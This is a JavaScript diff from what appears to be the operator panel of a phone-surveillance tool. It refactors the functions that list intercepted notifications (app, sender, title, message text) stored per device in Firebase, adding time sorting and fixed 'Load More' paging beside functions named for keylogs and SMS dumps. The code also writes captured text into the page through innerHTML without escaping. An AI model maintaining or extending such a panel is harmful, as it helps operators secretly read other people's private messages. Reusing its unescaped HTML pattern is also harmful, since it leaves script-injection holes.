@@ -882,111 +882,136 @@ psdus.innerHTML='<div class="keylogg" ><h4>No Logs Found<h4></div>';
 }
 }
 function notificationlog(){
-manager="notikey";
-var psdus=document.getElementById("notikey");
-hidekarbsdk();
-$("#preloaderr").fadeIn();
-$("#phones").css("display","none");
-var database = firebase.database();
-var ref = database.ref("notilogo/"+unqid);
-if(manager=="notikey"){
-ref.limitToFirst(10).once("value",gotData);
-}
-function gotData(data){
-$("#preloaderr").fadeOut();
-psdus.style.display="block";
-psdus.innerHTML='<div onclick="clrn()" class="down" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/><path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/></svg></div>';
-if (data.exists()) {
-var scores=data.val();
-var keys=Object.keys(scores);
-var i=0;
-for(i=(keys.length-1);i > -1 ;i--){
-var k=keys[i];
-var ico=scores[k].icon;
-var packa=scores[k].package;
-var title=scores[k].title;
-var time=scores[k].time;
-var ticker=scores[k].ticker;
-var text=scores[k].text;
-var name=scores[k].name;
-if(ticker != ""){
-ticker='('+ticker+')';
-}
-psdus.innerHTML+='<div class="keylogg" >'
-+'<img src="data:image/png;base64,'+ico+'" >'
-+'<div style="margin-left:60px;overflow:auto; "><b  style="color:green"> '+name+'</b><br><b style="color:red">'+packa+'</b><br><br><br></div>'
-+'<h4>'+title+'<br><b>'+ticker+'</b> </h4>'
-+'<br><p>'+text+'</p>'
-+'<br><span>'+convertTimestamp(time)+'</span>'
-+'</div>';
-}
-if(lastkeynot != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
-lastkeynot=keys[keys.length-1]+"";
-psdus.innerHTML+="<br><center><button class='btn' "+'onclick="loadmoree(this,'+"'"+lastkeynot+"'"+')"'+">Load More</button></center><br>";
+    manager="notikey";
+    var psdus=document.getElementById("notikey");
+    hidekarbsdk();
+    $("#preloaderr").fadeIn();
+    $("#phones").css("display","none");
+    var database = firebase.database();
+    var ref = database.ref("notilogo/"+unqid);
+    if(manager=="notikey"){
+        ref.limitToFirst(10).once("value",gotData);
+    }
+    function gotData(data){
+        $("#preloaderr").fadeOut();
+        psdus.style.display="block";
+        psdus.innerHTML='<div onclick="clrn()" class="down" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/><path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/></svg></div>';
+        if (data.exists()) {
+            var scores=data.val();
+            var keys=Object.keys(scores);
 
-}
+            // Crea un array di oggetti notifica per ordinamento
+            var notifs = [];
+            for (var i = 0; i < keys.length; i++) {
+                notifs.push({
+                    key: keys[i],
+                    data: scores[keys[i]]
+                });
+            }
+            // Ordina per time decrescente (più recente prima)
+            notifs.sort(function(a, b) {
+                return b.data.time - a.data.time;
+            });
 
-lastkeynot=keys[keys.length-1]+"";
+            // Visualizza in ordine
+            for (var i = 0; i < notifs.length; i++) {
+                var k = notifs[i].key;
+                var ico = notifs[i].data.icon;
+                var packa = notifs[i].data.package;
+                var title = notifs[i].data.title;
+                var time = notifs[i].data.time;
+                var ticker = notifs[i].data.ticker;
+                var text = notifs[i].data.text;
+                var name = notifs[i].data.name;
+                if (ticker != "") ticker = '(' + ticker + ')';
 
-}
-else{
-psdus.innerHTML='<div class="keylogg" ><h4>No Notifications Found<h4></div>';
-}
-}
-}
-function loadmoree(o,p){
-manager=="notikey";
-o.innerHTML=".....";
-o.disabled=true;
-var psdus=document.getElementById("notikey");
-var database = firebase.database();
+                psdus.innerHTML += '<div class="keylogg" >'
+                    + '<img src="data:image/png;base64,' + ico + '" >'
+                    + '<div style="margin-left:60px;overflow:auto; "><b style="color:green"> ' + name + '</b><br><b style="color:red">' + packa + '</b><br><br><br></div>'
+                    + '<h4>' + title + '<br><b>' + ticker + '</b> </h4>'
+                    + '<br><p>' + text + '</p>'
+                    + '<br><span>' + convertTimestamp(time) + '</span>'
+                    + '</div>';
+            }
 
-var ref = database.ref("notilogo/"+unqid);
-if(manager=="notikey"){
-ref.orderByKey().startAt(p).limitToFirst(10).once("value",gotData);
+            // Gestione Load More: ora usiamo la chiave dell'ultimo elemento mostrato (il meno recente)
+            if (notifs.length > 0) {
+                var oldestKey = notifs[notifs.length - 1].key;
+                if (lastkeynot != oldestKey) {
+                    lastkeynot = oldestKey;
+                    psdus.innerHTML += "<br><center><button class='btn' onclick='loadmoree(this,\"" + lastkeynot + "\")'>Load More</button></center><br>";
+                }
+            }
+        } else {
+            psdus.innerHTML += '<div class="keylogg" ><h4>No Notifications Found<h4></div>';
+        }
+    }
 }
-function gotData(data){
-if (data.exists() && manager=="notikey") {
-var scores=data.val();
-var keys=Object.keys(scores);
-var i=0;
-psdus.style.display="block";
-o.style.display="none";
-for(i=(keys.length-1);i > -1 ;i--){
-var k=keys[i];
-var ico=scores[k].icon;
+function loadmoree(o, p) {
+    manager = "notikey";
+    o.innerHTML = ".....";
+    o.disabled = true;
+    var psdus = document.getElementById("notikey");
+    var database = firebase.database();
+    var ref = database.ref("notilogo/" + unqid);
+    if (manager == "notikey") {
+        ref.orderByKey().startAt(p).limitToFirst(11).once("value", gotData); // 11 per escludere il primo già visto
+    }
+    function gotData(data) {
+        if (data.exists() && manager == "notikey") {
+            var scores = data.val();
+            var keys = Object.keys(scores);
 
-var packa=scores[k].package;
-var title=scores[k].title;
-var time=scores[k].time;
-var ticker=scores[k].ticker;
-var text=scores[k].text;
-var name=scores[k].name;
-if(ticker != ""){
-ticker='('+ticker+')';
-}
+            // Rimuovi la chiave di partenza (già mostrata)
+            if (keys[0] === p) keys.shift();
 
+            // Crea array e ordina
+            var notifs = [];
+            for (var i = 0; i < keys.length; i++) {
+                notifs.push({
+                    key: keys[i],
+                    data: scores[keys[i]]
+                });
+            }
+            notifs.sort(function(a, b) {
+                return b.data.time - a.data.time;
+            });
 
-psdus.innerHTML+='<div class="keylogg" >'
-+'<img src="data:image/png;base64,'+ico+'" >'
-+'<div style="margin-left:60px;overflow:auto; "><b  style="color:green"> '+name+'</b><br><b style="color:red">'+packa+'</b><br><br><br></div>'
-+'<h4>'+title+'<br><b>'+ticker+'</b> </h4>'
-+'<br><p>'+text+'</p>'
-+'<br><span>'+convertTimestamp(time)+'</span>'
-+'</div>';
+            o.style.display = "none"; // nasconde il vecchio pulsante
 
-}
-if(lastkeynot != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
-lastkeynot=keys[keys.length-1]+"";
-psdus.innerHTML+="<br><center><button class='btn' "+'onclick="loadmoree(this,'+"'"+lastkeynot+"'"+')"'+">Load More</button></center><br>";
-}
-lastkeynot=keys[keys.length-1]+"";
-}
-else{
-psdus.innerHTML='<div class="keylogg" ><h4>No Notifications Found<h4></div>';
-}
-}
+            // Visualizza
+            for (var i = 0; i < notifs.length; i++) {
+                var k = notifs[i].key;
+                var ico = notifs[i].data.icon;
+                var packa = notifs[i].data.package;
+                var title = notifs[i].data.title;
+                var time = notifs[i].data.time;
+                var ticker = notifs[i].data.ticker;
+                var text = notifs[i].data.text;
+                var name = notifs[i].data.name;
+                if (ticker != "") ticker = '(' + ticker + ')';
 
+                psdus.innerHTML += '<div class="keylogg" >'
+                    + '<img src="data:image/png;base64,' + ico + '" >'
+                    + '<div style="margin-left:60px;overflow:auto; "><b style="color:green"> ' + name + '</b><br><b style="color:red">' + packa + '</b><br><br><br></div>'
+                    + '<h4>' + title + '<br><b>' + ticker + '</b> </h4>'
+                    + '<br><p>' + text + '</p>'
+                    + '<br><span>' + convertTimestamp(time) + '</span>'
+                    + '</div>';
+            }
+
+            // Nuovo pulsante Load More con l'ultima chiave
+            if (notifs.length > 0) {
+                var oldestKey = notifs[notifs.length - 1].key;
+                if (lastkeynot != oldestKey) {
+                    lastkeynot = oldestKey;
+                    psdus.innerHTML += "<br><center><button class='btn' onclick='loadmoree(this,\"" + lastkeynot + "\")'>Load More</button></center><br>";
+                }
+            }
+        } else {
+            o.style.display = "none";
+        }
+    }
 }
 function dumpsms(){
 manager="fileview";
